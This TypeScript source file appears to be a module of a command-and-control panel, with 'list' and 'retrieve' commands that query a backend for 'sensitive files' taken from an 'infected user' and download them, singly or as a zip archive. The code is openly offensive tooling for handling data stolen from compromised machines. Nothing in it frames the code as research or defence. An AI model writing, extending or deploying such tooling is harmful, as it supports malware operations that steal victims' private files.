import { Command } from '@/Interfaces/Command';
import { Module } from '@/Interfaces/Module';

let files: any = {};

const list: Command = {
    execute: async (user, args, addOutput) => {
        try {
            addOutput("Retrieving sensitive files from...");
            const response = await fetch("http://localhost:8000/api/modules/sensitive-files/list?id=" + user.uuid);
            const data = await response.json();
            files = data;
            addOutput("Listed sensitive files: ");
            let count = 0;
           Object.keys(data).forEach((item: string) => {
               count++
                // Assuming each item in data is an object with a 'key' property
                addOutput(count.toString() + " . " + item); // Replace 'key' with the actual property you want to display
            });
        } catch (error) {
            console.error("Error listing sensitive files:", error);
        }
    },
    help: "List all sensitive files from the infected user. Usage: /sensitiveFiles/list"
};

const retrieve: Command = {
    execute: async (user, args, addOutput) => {
        try {
            const file_name = Object.keys(files)[parseInt(args.number) - 1]
            addOutput("Retrieving sensitive files...");
            const response = await fetch(`http://localhost:8000/api/modules/sensitive-files/retrieve?id=${user.uuid}&filename=${file_name || '*'}`);

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = args.filename === '*' ? 'all_files.zip' : args.filename;
                document.body.appendChild(a);
                a.click();
                a.remove();
                window.URL.revokeObjectURL(url);
                addOutput("File download started.");
            } else {
                const errorData = await response.json();
                addOutput(`Error: ${errorData.detail}`);
            }
        } catch (error:any) {
            console.error("Error retrieving sensitive files:", error);
            addOutput(`Error: ${error.message}`);
        }
    },
    help: "Retrieve sensitive files from infected user. Usage: /sensitiveFiles/retrieve :number=<number from list>"
};

export const sensitiveFilesModule: Module = {
    commands: {
        list,
        retrieve
    },
    help: 'Module for retrieving sensitive files.'
};

